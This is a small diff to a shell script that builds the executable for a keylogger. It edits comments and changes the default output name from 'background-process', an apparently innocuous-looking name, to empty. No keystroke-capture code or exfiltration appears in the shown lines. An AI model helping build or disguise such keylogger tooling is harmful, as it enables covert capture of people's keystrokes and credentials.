@@ -4,11 +4,11 @@
 
 # shell script to generate the executable file for the keylogger
 # run this using dash to ensure greatest extent of POSIX compliance accross platforms
+
+# all flags have default values set inside keylogger.py so they don't have to be set in here
+
 # the executable will be moved to ~/-outputname
-
-outputname='background-process'
-
-# these two can be set inside keylogger.py so only record if entered 
+outputname=''
 passphrase=''
 logsmethod=''
 while [ $# -gt 0 ]
